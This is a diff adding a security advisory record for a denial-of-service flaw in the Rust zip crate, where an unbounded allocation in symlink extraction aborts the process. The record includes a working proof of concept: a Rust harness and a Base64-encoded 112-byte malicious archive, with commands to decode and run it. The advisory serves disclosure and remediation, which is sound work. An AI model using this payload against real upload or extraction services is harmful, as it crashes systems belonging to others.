@@ -1,0 +1,61 @@
+{
+  "id": "GHSA-q7v9-x93c-xqv3",
+  "modified": "2026-10-29T17:00:04.183198126Z",
+  "published": "2026-10-29T16:40:01Z",
+  "aliases": [
+    "CVE-2026-115909"
+  ],
+  "summary": "zip: Unbounded Symlink-Target Handling Can Abort Or Exhaust Memory During Extraction",
+  "details": "### Summary\n\nThe symbolic-link branch of `ZipArchive::extract_internal()` allocates a buffer using an attacker-declared size before reading any entry data. A 112-byte archive terminates the extracting process with `SIGABRT` through this infallible allocation.\n\n### Details\n\n```rust\n#[cfg(any(unix, windows))]\nif file.is_symlink() {\n    let mut target = Vec::with_capacity(file.size() as usize); // @audit unbounded memory allocation\n    file.read_to_end(\u0026mut target)?;\n    drop(file);\n    make_symlink(\u0026outpath, \u0026target, \u0026self.shared.files)?;\n    continue;\n}\n```\n\n[`src/read/mod.rs#L399-L405`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/mod.rs#L399-L405) (reviewed commit `6f09b306`); the same code is at [`src/read.rs#L417-L418`](https://github.com/zip-rs/zip2/blob/v8.6.0/src/read.rs#L417-L418) in released v8.6.0.\n\nBoth inputs are attacker-controlled:\n\n- [`ZipFile::size()`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/zipfile.rs#L243-L246) returns `uncompressed_size` verbatim from the central directory record. A ZIP64 extended-information extra field widens it to a full `u64` ([`src/read/mod.rs#L619-L625`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/mod.rs#L619-L625)). It is never cross-checked against the compressed size, the remaining archive length, or any platform-appropriate bound for a symlink target.\n- [`ZipFile::is_symlink()`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/zipfile.rs#L256-L260) is decided entirely by the central directory's external-attributes field, via the `S_IFLNK` bit.\n\n**Memory allocation failure → uncatchable process abort.** The reservation is sized from the declared `uncompressed_size` before a single byte of the entry is read. `Vec::with_capacity()` is infallible: on allocator refusal it calls `handle_alloc_error()`, which aborts the process. This is not a Rust panic — it is not caught by `catch_unwind()`, is unaffected by `panic = \"unwind\"`, and is not contained by isolating the call in a worker thread. This was verified by wrapping the call in all three at once; the process still died with exit 134.\n\nThe declared value needed is a property of the host's address space, not of reachability. On a 64 GB host with heuristic overcommit, declared sizes from roughly `2^38` upward abort reliably. Sizes at or above `2^63` instead trip `Vec`'s internal capacity check and produce a *catchable* `capacity overflow` panic, so an attacker simply avoids that band. The reproducer declares `2^62`, which exceeds the 47-bit user address space of x86-64 Linux outright and therefore aborts deterministically regardless of installed RAM or overcommit policy. Under a `ulimit -v` cap or a memory-constrained container the threshold drops far enough that a plain 32-bit `uncompressed_size` with no ZIP64 field suffices — a virtual-memory limit lowers the bar rather than mitigating the defect.\n\nThis is process termination, not memory exhaustion: `Vec::with_capacity()` only maps address space and never touches pages, so resident memory stays flat and the abort happens on the refused reservation itself, before any byte is read.\n\n### PoC\n\nThe reproducer consists of the following `zip` harness and payload. It requires only the `zip` crate; use a standard Base64 decoder to materialise the archive before running it.\n\n```toml\n[package]\nname = \"zip-poc\"\nversion = \"0.1.0\"\nedition = \"2021\"\n\n[dependencies]\nzip = \"8.6.0\"\n```\n\n```rust\nuse std::{env, fs::File, io::BufReader};\n\nfn main() {\n    let archive_path = env::args().nth(1).expect(\"usage: poc \u003carchive.zip\u003e\");\n    let outdir = std::env::temp_dir().join(\"zip-poc\");\n    std::fs::create_dir_all(\u0026outdir).unwrap();\n\n    let file = File::open(archive_path).unwrap();\n    let mut archive = zip::ZipArchive::new(BufReader::new(file)).unwrap();\n    let r = archive.extract(\u0026outdir);            // \u003c-- process dies here\n    println!(\"SURVIVED: {:?}\", r);\n}\n```\n\nSave the Base64 payload below as `archive.b64`, remove its whitespace, decode it with a standard Base64 decoder (for example, `base64 -d archive.b64 \u003e archive.zip` on Linux), and run `cargo run --release -- archive.zip`.\n\n**Uncatchable abort — 112 bytes.** One `Stored` entry named `a`; external attributes `0xA1FF0000` (`S_IFLNK|0777`); ZIP64 extra field declaring `uncompressed_size = 2^62`; zero-byte payload. sha256 `0c68c3934f22651a6bd2726f7d58140124b1839196a1d0ae468864cdfda74676`.\n\n```\nUEsDBC0AAAAAAAAAAAAAAAAAAAAAAP////8BAAAAYVBLAQItAy0AAAAAAAAAAAAAAAAAAAAAAP//\n//8BAAwAAAAAAAAAAAD/oQAAAABhAQAIAAAAAAAAAABAUEsFBgAAAAABAAEAOwAAAB8AAAAAAA==\n```\n\nObserved on x86-64 Linux, rustc 1.93.1, release profile, against both the reviewed commit and released v8.6.0:\n\n```\nentries=1\nmemory allocation of 4611686018427387904 bytes failed\nAborted (core dumped)          # exit 134\n```\n\nThe `SURVIVED` line never prints. Wrapping `extract()` in `catch_unwind` inside a spawned thread with `panic = \"unwind\"` produces the identical outcome.\n\n### Impact\n\nApplications running on Unix or Windows targets that call `ZipArchive::extract()` on attacker-supplied input are affected, with default features and no special configuration. The malicious 112-byte archive causes an unrecoverable, uncatchable termination of the extracting process, repeatable at will and not mitigable at the call site with `catch_unwind`, a worker thread, or a pre-flight metadata check.\n\nUpload handling, mail-attachment processing, package and artefact ingestion, backup restore and container-image layer extraction all match this pattern. No confidentiality or integrity property is affected: no memory unsafety, no out-of-bounds access, no disclosure and no data corruption.\n\n### Suggested remediation\n\nBefore allocating, compare `file.size()` with a documented, platform-appropriate maximum symlink-target length and reject entries that exceed it. Alternatively, replace `Vec::with_capacity()` with fallible `try_reserve()` and return an I/O error when allocation fails. Do not use Linux's `PATH_MAX` as a cross-platform contract.\n\nApply the allocation fix to `src/read/stream.rs` as defence-in-depth, although its symlink path is currently unreachable because streaming entries have no symlink attributes.\n\nFor reference, the crate already applies exactly this defence to another untrusted size on the same path: `ZipArchive::new()` clamps a suspicious `number_of_files` to zero and explicitly rejects an oversized central directory before reserving ([`src/read/zip_archive.rs#L185-L202`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/zip_archive.rs#L185-L202)). The symlink branch received neither guard. A survey of `Vec::with_capacity` across `src/` finds exactly two sites sized from untrusted input: `src/read/mod.rs:401` and `src/read/stream.rs:73`.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "crates.io",
+        "name": "zip",
+        "purl": "pkg:cargo/zip"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "1.3.0"
+            },
+            {
+              "fixed": "9.0.0"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-q7v9-x93c-xqv3/GHSA-q7v9-x93c-xqv3.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/zip-rs/zip2/security/advisories/GHSA-q7v9-x93c-xqv3"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-115909"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/zip-rs/zip2/pull/984"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/zip-rs/zip2/commit/a543a1fc8f3f3eef36f27bb137230295284cdb98"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/zip-rs/zip2"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/zip-rs/zip2/releases/tag/v9.0.0"
+    }
+  ]
+}
